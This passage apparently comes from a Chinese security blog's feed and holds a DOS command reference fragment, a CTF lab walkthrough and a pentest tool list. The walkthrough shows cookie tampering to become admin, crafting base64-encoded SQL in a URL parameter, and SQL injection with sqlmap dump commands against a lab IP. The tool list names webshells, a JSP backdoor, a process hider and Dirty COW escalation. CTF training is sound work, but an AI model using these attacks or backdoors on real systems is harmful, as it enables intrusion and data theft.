class="headerlink" title="1.11 deltree"></a>1.11 deltree</h2><blockquote><p>[功能] 删除目录树 </p></blockquote><blockquote><p>[格式] [C:][path]DELTREE [C1:][path1] [[C2:][path2] […]] </p></blockquote><blockquote><p>[说明] 这个命令将整个指定目录树全部消灭，而不管它是否是只读、隐藏与否。使用应特别小心。它是一个危险命令。 </p></blockquote><h2 id="1-12-mem"><a href="#1-12-mem" class="headerlink" title="1.12 mem"></a>1.12 mem</h2><p>mem是memory的缩写 </p><blockquote><p>[功能] 该命令用来查看你的计算机内存有多少，以及内存的使用情况。 </p></blockquote><blockquote><p>[格式] 直接键入mem命令 </p></blockquote><h2 id="1-13-chkdsk"><a href="#1-13-chkdsk" class="headerlink" title="1.13 chkdsk"></a>1.13 chkdsk</h2><p>chkdsk是check disk的缩写。 </p><blockquote><p>[功能] 用来检查你的磁盘的使用情况。 </p></blockquote><blockquote><p>[格式] chkdsk　磁盘名 </p></blockquote><blockquote><p>[说明] 例如要检查A盘使用情况，就输入chkdsk　A: ，检查c盘使用情况，就输入chkdsk　C: ，如果直接输入chkdsk，就检查当前磁盘的使用情况。 </p></blockquote><h2 id="1-14-sys"><a href="#1-14-sys" class="headerlink" title="1.14 sys"></a>1.14 sys</h2><blockquote><p>[功能] 传递系统文件命令。将DOS的两个隐含的系统IO.SYS和MSDOS.SYS传送到目标磁盘的特定位置上，并将COMMAND.COM文件复制过去。完成后，目标盘成为DOS的启动盘。 </p></blockquote><blockquote><p>[格式] [C:][path]SYS [C1:][path] d2: </p></blockquote><blockquote><p>[说明] 由于这几个文件需要复制到特定位置上，所以用COPY命令完成的复制未必能够启动机器。能过SYS命令，DOS可以将目标盘已占据特定位置的文件移动，并将系统文件复制到相应位置上。参数C1ath用来指明系统文件所在目录。如不指明，则缺省为当前盘的当前目录。所以这个命令一般要在源盘的根目录进行。 </p></blockquote><h2 id="1-15-path"><a href="#1-15-path" class="headerlink" title="1.15 path"></a>1.15 path</h2><blockquote><p>[功能] 设定DOS寻找.COM、.EXE、.BAT文件的所在目录 </p></blockquote><blockquote><p>[格式] path=[[drive:]path[;…]]或path </p></blockquote><h2 id="1-16-edit"><a href="#1-16-edit" class="headerlink" title="1.16 edit"></a>1.16 edit</h2><blockquote><p>[功能] edit命令是一个简单的编辑软件，我们经常用它来编辑一些程序和批处理文件。 </p></blockquote><h2 id="1-17-cls"><a href="#1-17-cls" class="headerlink" title="1.17 cls"></a>1.17 cls</h2><blockquote><p>[功能] 清除显示器屏幕上的内容，使DOS提示符到屏幕左上角。 </p></blockquote><blockquote><p>[格式] cls </p></blockquote><h2 id="1-18-time"><a href="#1-18-time" class="headerlink" title="1.18 time"></a>1.18 time</h2><blockquote><p>[功能] 显示和设置DOS的系统时间 </p></blockquote><blockquote><p>[格式] time [hh[:mm[:ss[.cc]]] </p></blockquote><h2 id="1-19-date"><a href="#1-19-date" class="headerlink" title="1.19 date"></a>1.19 date</h2><blockquote><p>[功能] 显示和设置DOS的系统日期 </p></blockquote><blockquote><p>[格式] date [MM-DD-YY] </p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114154239.png" class="lozad"></p><h2 id="1-20-ver"><a href="#1-20-ver" class="headerlink" title="1.20 ver"></a>1.20 ver</h2><blockquote><p>[功能] 显示正在运行的DOS系统版本号 </p></blockquote><blockquote><p>[格式] ver </p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114154655.png" class="lozad"></p><h1 id="0x02-其他命令"><a href="#0x02-其他命令" class="headerlink" title="0x02 其他命令"></a>0x02 其他命令</h1><p>attrib…………设置文件属性<br>ctty …………改变控制设备<br>defrag…………磁盘碎片整理<br>doskey…………调用和建立DOS宏命令<br>debug …………程序调试命令<br>emm386…………扩展内存管理<br>fc　　…………文件比较<br>fdisk …………硬盘分区<br>lh/loadhigh …将程序装入高端内存<br>move …………移动文件，改目录名<br>more　…………分屏显示<br>prompt…………设置提示符<br>set 　…………设置环境变量<br>smartdrv………设置磁盘加速器<br>setver…………设置版本<br>subst …………路径替换<br>vol　 …………显示指定的磁盘卷标号<br>xcopy …………拷贝目录和文</p><hr>]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF竞赛试题（跟新中）</title>
      <link href="/2019/09/03/CTF%E7%AB%9E%E8%B5%9B%E8%AF%95%E9%A2%98/"/>
      <url>/2019/09/03/CTF%E7%AB%9E%E8%B5%9B%E8%AF%95%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a><h1 id="0x01-第一关-不合理的验证方式"><a href="#0x01-第一关-不合理的验证方式" class="headerlink" title="0x01 第一关-不合理的验证方式"></a>0x01 第一关-不合理的验证方式</h1><h2 id="1-1-题目背景"><a href="#1-1-题目背景" class="headerlink" title="1.1 题目背景"></a>1.1 题目背景</h2><p>Web 用户的身份验证，及页面操作权限验证是 B/S 系统的基础功能，一个功<br>能复杂的业务应用系统，通过角色授权来控制用户访问。Web 系统的用户登录<br>及页面操作权限验证在处理逻辑上比较复杂，通过 Session 和 Cookie 存储，以及<br>Session 和 Cookie 的过期处理来控制用户身份 。</p><h2 id="1-2-题目描述"><a href="#1-2-题目描述" class="headerlink" title="1.2  题目描述"></a>1.2  题目描述</h2><p>一个 web 系统中管理员账户：admin 中有一串 key，页面只提供了试用账号<br>密码：test test ，我们需要登录进 admin 账户获取 key 来通过本关。</p><h2 id="1-3-答案提交"><a href="#1-3-答案提交" class="headerlink" title="1.3 答案提交"></a>1.3 答案提交</h2><ol><li>提交得到的 key。</li><li>请提交操作过程报告，报告中要包含操作的关键过程描述并附截图，以 WORD<br>方式提交。</li></ol><h2 id="1-4-提交key"><a href="#1-4-提交key" class="headerlink" title="1.4 提交key"></a>1.4 提交key</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key：I am admin</span><br></pre></td></tr></table></figure><h2 id="1-5-关卡环境"><a href="#1-5-关卡环境" class="headerlink" title="1.5 关卡环境"></a>1.5 关卡环境</h2><ol><li><p>VPC1( 虚拟 PC ）:工具场景：Windows XP 操作系统/BT5</p></li><li><p>VPC2( 虚拟 PC ）:Window server xp</p></li><li><p>软件描述:使用工具场景集成的工具软件，参赛者也可以上传工具软<br>件软件到工具场景</p></li><li><p>关卡环境描述:</p><ol><li>学生机与实验室网络直连</li><li>VPC 与实验室网络直连</li><li>学生机与 VPC 物理链路连通</li></ol></li></ol><h2 id="1-6-参考步骤"><a href="#1-6-参考步骤" class="headerlink" title="1.6 参考步骤"></a>1.6 参考步骤</h2><p>1.打开浏览器，访问 <a href="http://192.168.102.62。" target="_blank" rel="noopener">http://192.168.102.62。</a></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903213809.png" class="lozad"></p><p>2.使用账号密码：test test 登录</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903213844.png" class="lozad"></p><p>3.使用 Firefox 的 firebug 插件查看 cookies。发现只有 user 段，值为 test。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903213904.png" class="lozad"></p><p>4.将 test 修改为 admin，再次访问页面，得到 key：I am admin</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903213933.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903213949.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214009.png" class="lozad"></p><p>Cookie：判断用户信息的凭据，存储在本地</p><p>Test 用户登录产生的 cookie 信息：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214042.png" class="lozad"></p><h1 id="0x02-加密与解密的对抗"><a href="#0x02-加密与解密的对抗" class="headerlink" title="0x02 加密与解密的对抗"></a>0x02 加密与解密的对抗</h1><h2 id="2-1-题目背景"><a href="#2-1-题目背景" class="headerlink" title="2.1 题目背景"></a>2.1 题目背景</h2><p>数据加密的基本过程就是对原来为明文的文件或数据按某种算法进<br>行处理，使其成为不可读的一段代码，通常称为“<strong>密文</strong>”，使其只能在<br>输入相应的密钥之后才能显示出本来内容，通过这样的途径来达到保护<br>数据不被非法人窃取、阅读的目的。 该过程的逆过程为解密，即将该<br>编码信息转化为其原来数据的过程</p><h2 id="2-2-题目描述"><a href="#2-2-题目描述" class="headerlink" title="2.2 题目描述"></a>2.2 题目描述</h2><p>一个 web 页面只给了 2 个奇怪的超链接，访问 2 个连接会导致列表的排序不<br>一样。这一关通过观察页面，构造 url，访问得到 key 通过本关。</p><h2 id="2-3-答案提交"><a href="#2-3-答案提交" class="headerlink" title="2.3 答案提交"></a>2.3 答案提交</h2><ol><li>提交得到的 key。</li><li>请提交操作过程报告，报告中要包含操作的关键过程描述并附截图，以 WORD<br>方式提交。</li></ol><h2 id="2-4-提交key"><a href="#2-4-提交key" class="headerlink" title="2.4 提交key"></a>2.4 提交key</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key:hello world</span><br></pre></td></tr></table></figure><h2 id="2-5-关卡环境"><a href="#2-5-关卡环境" class="headerlink" title="2.5 关卡环境"></a>2.5 关卡环境</h2><ol><li>VPC1( 虚拟 PC ） 工具场景：Windows XP 操作系统/BT5</li><li>VPC2( 虚拟 PC ）: Window server xp</li><li>软件描述:使用工具场景集成的工具软件，参赛者也可以上传工具软件软件到工具场景。</li><li>关卡环境描述:<ol><li>学生机与实验室网络直连</li><li>VPC 与实验室网络直连</li><li>学生机与 VPC 物理链路连通</li></ol></li></ol><h2 id="2-6-参考步骤"><a href="#2-6-参考步骤" class="headerlink" title="2.6 参考步骤"></a>2.6 参考步骤</h2><p>1.打开浏览器，访问 <a href="http://192.168.102.62。" target="_blank" rel="noopener">http://192.168.102.62。</a></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214542.png" class="lozad"></p><p>2.通过查看源码，查看 2 个超链接的地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.php?word=U0VMRUNUKyUyQStGUk9NK2xhbmd1YWdlK29yZGVyK2J5K3JhbmtpbmcrbGltaXQrMCUyQzQ=</span><br><span class="line"></span><br><span class="line">index.php?word=U0VMRUNUKyUyQStGUk9NK2xhbmd1YWdlK29yZGVyK2J5K3llYXIrbGltaXQrMCUyQzQ=</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214648.png" class="lozad"></p><p>3.2 个地址的 Word 参数是 base64 加密，将其解密</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214808.png" class="lozad"></p><p>4.解密后的字符串：<br><code>SELECT+%2A+FROM+language+order+by+year+limit+0%2C4</code><br>是 <code>url</code> 加密，再次解密：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214841.png" class="lozad"></p><p>5.解密结果是一个 sql 语句。构造新的语句：<br>SELECT * FROM language order by year<br>将其 url 加密</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214904.png" class="lozad"></p><p>6.将得到的字符串 base64 加密</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214932.png" class="lozad"></p><p>7.得到的加密串构造地址：</p><p><a href="http://192.168.102.62/index.php?word=U0VMRUNUKyorRlJPTStsYW5ndWFnZStvcmRlcitieSt5ZWFy" target="_blank" rel="noopener">http://192.168.102.62/index.php?word=U0VMRUNUKyorRlJPTStsYW5ndWFnZStvcmRlcitieSt5ZWFy</a><br>8.访问得到 key:hello world 。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215033.png" class="lozad"></p><h1 id="0x03-一个SQL引发的血案"><a href="#0x03-一个SQL引发的血案" class="headerlink" title="0x03 一个SQL引发的血案"></a>0x03 一个SQL引发的血案</h1><h2 id="3-1-题目背景"><a href="#3-1-题目背景" class="headerlink" title="3.1 题目背景"></a>3.1 题目背景</h2><p>SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或<br>页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令，比<br>如先前的很多影视网站泄露 VIP会员密码大多就是通过WEB表单递交查<br>询字符暴出的，这类表单特别容易受到 SQL 注入式攻击。</p><h2 id="3-2-题目描述"><a href="#3-2-题目描述" class="headerlink" title="3.2 题目描述"></a>3.2 题目描述</h2><p>一个 web 页面列了 2014 年 6 月编程语言排行榜。我们需要通过此页面，查<br>询到数据库里的内容，得到 key。</p><h2 id="3-3-答案提交"><a href="#3-3-答案提交" class="headerlink" title="3.3 答案提交"></a>3.3 答案提交</h2><ol><li>提交得到的 key。</li><li>请提交操作过程报告，报告中要包含操作的关键过程描述并附截图，以 WORD<br>方式提交。</li></ol><h2 id="3-4-提交key"><a href="#3-4-提交key" class="headerlink" title="3.4 提交key"></a>3.4 提交key</h2><p>​    key:I am sql inject</p><h2 id="3-5-关卡环境"><a href="#3-5-关卡环境" class="headerlink" title="3.5 关卡环境"></a>3.5 关卡环境</h2><p>VPC1( 虚拟 PC ） 工具场景：Windows XP 操作系统/BT5<br>VPC2( 虚拟 PC ） Window server xp<br>软件描述 使用工具场景集成的工具软件，参赛者也可以上传工具软<br>件软件到工具场景。<br>关卡环境描述<br>1、学生机与实验室网络直连<br>2、VPC 与实验室网络直连<br>3、学生机与 VPC 物理链路连通</p><h2 id="3-6参考步骤"><a href="#3-6参考步骤" class="headerlink" title="3.6参考步骤"></a>3.6参考步骤</h2><p>1.打开浏览器，访问 <a href="http://192.168.102.62。" target="_blank" rel="noopener">http://192.168.102.62。</a></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215511.png" class="lozad"></p><p>2.访问超链接：<br><a href="http://192.168.102.62/index.php?id=1" target="_blank" rel="noopener">http://192.168.102.62/index.php?id=1</a><br>通过修改 id 的值可以查看到相应排名的语言</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215543.png" class="lozad"></p><p>3.访问:<a href="http://192.168.102.62/index.php?id=1" target="_blank" rel="noopener">http://192.168.102.62/index.php?id=1</a> and 1=1 返回正确内容。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215614.png" class="lozad"></p><p><a href="http://192.168.102.62/index.php?id=1" target="_blank" rel="noopener">http://192.168.102.62/index.php?id=1</a> and 1=2 返回错误内容。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215627.png" class="lozad"></p><p>4.通过上面可以判断存在注入。Kali 下使用 sqlmap 获取数据库内容。<br>使用命令：sqlmap -u “<a href="http://192.168.102.62/index.php?id=1”" target="_blank" rel="noopener">http://192.168.102.62/index.php?id=1”</a> –dbs 查看数据库。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215708.png" class="lozad"></p><p>使用命令：sqlmap -u “<a href="http://192.168.102.62/index.php?id=1”" target="_blank" rel="noopener">http://192.168.102.62/index.php?id=1”</a> –dump -D “third” 获取数据库内容。得到 key：I am sql inject</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215738.png" class="lozad"></p><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><h2 id="4-1-题目背景"><a href="#4-1-题目背景" class="headerlink" title="4.1 题目背景"></a>4.1 题目背景</h2><h2 id="4-2-题目描述"><a href="#4-2-题目描述" class="headerlink" title="4.2 题目描述"></a>4.2 题目描述</h2><h2 id="4-3-答案提交"><a href="#4-3-答案提交" class="headerlink" title="4.3 答案提交"></a>4.3 答案提交</h2><h2 id="4-4-提交key"><a href="#4-4-提交key" class="headerlink" title="4.4 提交key"></a>4.4 提交key</h2><h2 id="4-5-关卡环境"><a href="#4-5-关卡环境" class="headerlink" title="4.5 关卡环境"></a>4.5 关卡环境</h2><h2 id="4-6参考步骤"><a href="#4-6参考步骤" class="headerlink" title="4.6参考步骤"></a>4.6参考步骤</h2><h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><h2 id="5-1-题目背景"><a href="#5-1-题目背景" class="headerlink" title="5.1 题目背景"></a>5.1 题目背景</h2><h2 id="5-2-题目描述"><a href="#5-2-题目描述" class="headerlink" title="5.2 题目描述"></a>5.2 题目描述</h2><h2 id="5-3-答案提交"><a href="#5-3-答案提交" class="headerlink" title="5.3 答案提交"></a>5.3 答案提交</h2><h2 id="5-4-提交key"><a href="#5-4-提交key" class="headerlink" title="5.4 提交key"></a>5.4 提交key</h2><h2 id="5-5-关卡环境"><a href="#5-5-关卡环境" class="headerlink" title="5.5 关卡环境"></a>5.5 关卡环境</h2><h2 id="5-6参考步骤"><a href="#5-6参考步骤" class="headerlink" title="5.6参考步骤"></a>5.6参考步骤</h2><p>### </p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>优秀资源工具整理（不断更新中）</title>
      <link href="/2019/09/03/%E4%BC%98%E7%A7%80%E8%B5%84%E6%BA%90%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/"/>
      <url>/2019/09/03/%E4%BC%98%E7%A7%80%E8%B5%84%E6%BA%90%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在进行渗透测试的过程中，会用到大量的开源工具，每次在各种网站、论坛和知识星球中看到很多很好的工具，都没有时间进行及时的使用整理，久而久之就忘却了，所以使用该文章将每次碰到的优秀工具记录下来，然后在后期在进行归纳整理，既方便他人，也方便自己。皮卡皮卡~</p><a id="more"></a><h1 id="0x01-好用工具"><a href="#0x01-好用工具" class="headerlink" title="0x01 好用工具"></a>0x01 好用工具</h1><h2 id="1-1-B-XSSRF"><a href="#1-1-B-XSSRF" class="headerlink" title="1.1 B-XSSRF"></a>1.1 B-XSSRF</h2><p>用于检测和跟踪Blind XSS，XXE和SSRF的工具包</p><p><a href="https://github.com/SpiderMate/B-XSSRF" target="_blank" rel="noopener">https://github.com/SpiderMate/B-XSSRF</a></p><h2 id="1-2-BurpSuite-collections"><a href="#1-2-BurpSuite-collections" class="headerlink" title="1.2 BurpSuite-collections"></a>1.2 BurpSuite-collections</h2><p>BurpSuite收集：包括不限于Burp文章，破解版，插件（非BApp Store），汉化等相关教程</p><p><a href="https://github.com/Mr-xn/BurpSuite-collections" target="_blank" rel="noopener">https://github.com/Mr-xn/BurpSuite-collections</a></p><h2 id="1-3-排查网盘信息泄露"><a href="#1-3-排查网盘信息泄露" class="headerlink" title="1.3 排查网盘信息泄露"></a>1.3 排查网盘信息泄露</h2><p><a href="https://github.com/dongfangyuxiao/py-study/tree/master/py-study/威胁情报/网盘泄露" target="_blank" rel="noopener">https://github.com/dongfangyuxiao/py-study/tree/master/py-study/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/%E7%BD%91%E7%9B%98%E6%B3%84%E9%9C%B2</a></p><h2 id="1-4-pocsuite3"><a href="#1-4-pocsuite3" class="headerlink" title="1.4 pocsuite3"></a>1.4 pocsuite3</h2><p>pocsuite3是由Knownsec 404团队开发的开源远程漏洞测试框架</p><p><a href="https://github.com/knownsec/pocsuite3" target="_blank" rel="noopener">https://github.com/knownsec/pocsuite3</a></p><p><strong>进程隐藏工具libprocesshider.so</strong></p><p>此工具作用为劫持系统的readdir64和readdir函数，隐藏”proxy”进程。</p><h2 id="1-5-进程隐藏工具libprocesshider-so"><a href="#1-5-进程隐藏工具libprocesshider-so" class="headerlink" title="1.5 进程隐藏工具libprocesshider.so"></a>1.5 <strong>进程隐藏工具libprocesshider.so</strong></h2><p>此工具作用为劫持系统的readdir64和readdir函数，隐藏”proxy”进程。</p><h2 id="1-6-流量代理工具proxy"><a href="#1-6-流量代理工具proxy" class="headerlink" title="1.6 流量代理工具proxy"></a>1.6 <strong>流量代理工具proxy</strong></h2><p>Proxy为Dog Tunnel(狗洞)，<a href="https://github.com/vzex/dog-tunnel/，go语言编写的流量代理工具：" target="_blank" rel="noopener">https://github.com/vzex/dog-tunnel/，go语言编写的流量代理工具：</a></p><h2 id="1-7-冰蝎一句话木马"><a href="#1-7-冰蝎一句话木马" class="headerlink" title="1.7 冰蝎一句话木马"></a>1.7 <strong>冰蝎一句话木马</strong></h2><p>作为新型加密网站管理客户端，冰蝎算是作为中国菜刀的替代者。此次发现的样本为冰蝎JSP一句话木马</p><p><a href="https://github.com/rebeyond/Behinder/releases" target="_blank" rel="noopener">https://github.com/rebeyond/Behinder/releases</a></p><h2 id="1-8-JSP-WEB后门live-index-bank3-jsp"><a href="#1-8-JSP-WEB后门live-index-bank3-jsp" class="headerlink" title="1.8  JSP WEB后门live_index_bank3.jsp"></a>1.8  <strong>JSP WEB后门live_index_bank3.jsp</strong></h2><p>这是一个常规的JAVA WEB后门，通过调用.jsp?nox=”命令”来执行命令</p><h2 id="1-9-Linux辅助提权工具LinEnum-sh"><a href="#1-9-Linux辅助提权工具LinEnum-sh" class="headerlink" title="1.9  Linux辅助提权工具LinEnum.sh"></a>1.9  Linux辅助提权工具LinEnum.sh</h2><h2 id="1-10-脏牛提权工具c0w64"><a href="#1-10-脏牛提权工具c0w64" class="headerlink" title="1.10  脏牛提权工具c0w64"></a>1.10  <strong>脏牛提权工具c0w64</strong></h2><h2 id="1-11-内网流量代理工具agent-exe"><a href="#1-11-内网流量代理工具agent-exe" class="headerlink" title="1.11 内网流量代理工具agent.exe"></a>1.11 <strong>内网流量代理工具agent.exe</strong></h2><p>agent.exe是nps工具（<a href="https://github.com/cnlh/nps），" target="_blank" rel="noopener">https://github.com/cnlh/nps），</a></p><p>是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端：</p><h2 id="1-12-dog-tunnel"><a href="#1-12-dog-tunnel" class="headerlink" title="1.12 dog-tunnel"></a>1.12 <strong>dog-tunnel</strong></h2><p>基于KCP的P2P端口映射工具，同时支持SOCKS5代理</p><p><a href="https://github.com/vzex/dog-tunnel/" target="_blank" rel="noopener">https://github.com/vzex/dog-tunnel/</a></p><h2 id="1-13-sqlmap4burp"><a href="#1-13-sqlmap4burp" class="headerlink" title="1.13 sqlmap4burp ++"></a>1.13 sqlmap4burp ++</h2><p>sqlmap4burp ++是一款兼容于Windows，Mac，Linux的多个系统平台的打嗝与SqlMap的联动插件</p><h2 id="1-14-移动安全框架-MobSF"><a href="#1-14-移动安全框架-MobSF" class="headerlink" title="1.14 移动安全框架 - MobSF"></a>1.14 移动安全框架 - MobSF</h2><p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/wiki/1.-Documentation" target="_blank" rel="noopener">https://github.com/MobSF/Mobile-Security-Framework-MobSF/wiki/1.-Documentation</a></p><p>安装部署教程：<a href="https://www.mad-coding.cn/2019/10/11/使用docker安装移动安全框架（MobSF）/#0x01-开始安装">https://www.mad-coding.cn/2019/10/11/%E4%BD%BF%E7%94%A8docker%E5%AE%89%E8%A3%85%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E6%A1%86%E6%9E%B6%EF%BC%88MobSF%EF%BC%89/#0x01-%E5%BC%80%E5%A7%8B%E5%AE%89%E8%A3%85</a></p><h2 id="1-15-简单的iOS应用黑盒评估工具"><a href="#1-15-简单的iOS应用黑盒评估工具" class="headerlink" title="1.15 简单的iOS应用黑盒评估工具"></a>1.15 简单的iOS应用黑盒评估工具</h2><p><a href="https://github.com/chaitin/passionfruit" target="_blank" rel="noopener">https://github.com/chaitin/passionfruit</a></p><h2 id="1-16-适用于开发人员，逆向工程人员和安全研究人员的动态仪表工具包"><a href="#1-16-适用于开发人员，逆向工程人员和安全研究人员的动态仪表工具包" class="headerlink" title="1.16 适用于开发人员，逆向工程人员和安全研究人员的动态仪表工具包"></a>1.16 适用于开发人员，逆向工程人员和安全研究人员的动态仪表工具包</h2><p><a href="https://www.frida.re/" target="_blank" rel="noopener">https://www.frida.re/</a></p><h2 id="1-17-最先进的XSS扫描仪"><a href="#1-17-最先进的XSS扫描仪" class="headerlink" title="1.17 最先进的XSS扫描仪"></a>1.17 最先进的XSS扫描仪</h2><p><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">https://github.com/s0md3v/XSStrike</a></p><h2 id="1-18-XSS知识集合"><a href="#1-18-XSS知识集合" class="headerlink" title="1.18 XSS知识集合"></a>1.18 XSS知识集合</h2><p><a href="https://github.com/s0md3v/AwesomeXSS#awesome-xss-mind-maps" target="_blank" rel="noopener">https://github.com/s0md3v/AwesomeXSS#awesome-xss-mind-maps</a></p><h2 id="1-19-Lockdoor-Framework"><a href="#1-19-Lockdoor-Framework" class="headerlink" title="1.19 Lockdoor-Framework"></a>1.19 <strong>Lockdoor-Framework</strong></h2><p><a href="https://github.com/SofianeHamlaoui/Lockdoor-Framework" target="_blank" rel="noopener">https://github.com/SofianeHamlaoui/Lockdoor-Framework</a></p><h2 id="1-20-AttackSurfaceMapper-ASM"><a href="#1-20-AttackSurfaceMapper-ASM" class="headerlink" title="1.20 AttackSurfaceMapper(ASM)"></a>1.20 AttackSurfaceMapper(ASM)</h2><p>新型自动化渗透测试工具</p><p><a href="https://www.uedbox.com/post/59110/" target="_blank" rel="noopener">https://www.uedbox.com/post/59110/</a></p><h2 id="1-21-apkinspector"><a href="#1-21-apkinspector" class="headerlink" title="1.21 apkinspector"></a>1.21 <strong>apkinspector</strong></h2><p><a href="https://github.com/honeynet/apkinspector/" target="_blank" rel="noopener">https://github.com/honeynet/apkinspector/</a></p><h2 id="1-22-史上最全Windows安全工具锦集"><a href="#1-22-史上最全Windows安全工具锦集" class="headerlink" title="1.22 史上最全Windows安全工具锦集"></a>1.22 史上最全Windows安全工具锦集</h2><p><a href="https://www.freebuf.com/sectool/215644.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/215644.html</a></p><h2 id="1-23-安卓APP脱壳的本质以及如何快速发现ART下的脱壳点"><a href="#1-23-安卓APP脱壳的本质以及如何快速发现ART下的脱壳点" class="headerlink" title="1.23 安卓APP脱壳的本质以及如何快速发现ART下的脱壳点"></a>1.23 <strong>安卓APP脱壳的本质以及如何快速发现ART下的脱壳点</strong></h2><p><a href="https://www.52pojie.cn/thread-1026370-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1026370-1-1.html</a></p><h2 id="1-24-pydictor"><a href="#1-24-pydictor" class="headerlink" title="1.24 pydictor"></a>1.24 pydictor</h2><p>一个强大实用的黑客暴力破解字典建立工具</p><p><a href="https://github.com/LandGrey/pydictor" target="_blank" rel="noopener">https://github.com/LandGrey/pydictor</a></p><h2 id="1-25-目录扫描工具"><a href="#1-25-目录扫描工具" class="headerlink" title="1.25 目录扫描工具"></a>1.25 目录扫描工具</h2><h3 id="1-BBScan"><a href="#1-BBScan" class="headerlink" title="1. BBScan"></a>1. BBScan</h3><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></p><h2 id="1-26-Perun"><a href="#1-26-Perun" class="headerlink" title="1.26 Perun"></a>1.26 Perun</h2><p>是一种主要适用于乙方安服，渗透测试人员和甲方RedTeam红队人员的网络资产入侵扫描器/扫描框架</p><p><a href="https://github.com/WyAtu/Perun" target="_blank" rel="noopener">https://github.com/WyAtu/Perun</a></p><h1 id="0x02-其他工具"><a href="#0x02-其他工具" class="headerlink" title="0x02 其他工具"></a>0x02 其他工具</h1><h2 id="2-1-URL缩短器polr"><a href="#2-1-URL缩短器polr" class="headerlink" title="2.1 URL缩短器polr"></a>2.1 URL缩短器<strong>polr</strong></h2><p><a href="https://github.com/cydrobolt/polr/" target="_blank" rel="noopener">https://github.com/cydrobolt/polr/</a></p><h1 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h1><p><a href="http://www.sohu.com/a/324075541_609556" target="_blank" rel="noopener">http://www.sohu.com/a/324075541_609556</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>优秀文章整理</title>
      <link href="/2019/09/03/%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0%E6%95%B4%E7%90%86/"/>
      <url>/2019/09/03/%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0%E6%95%B4%E7%90%86/</url>
      
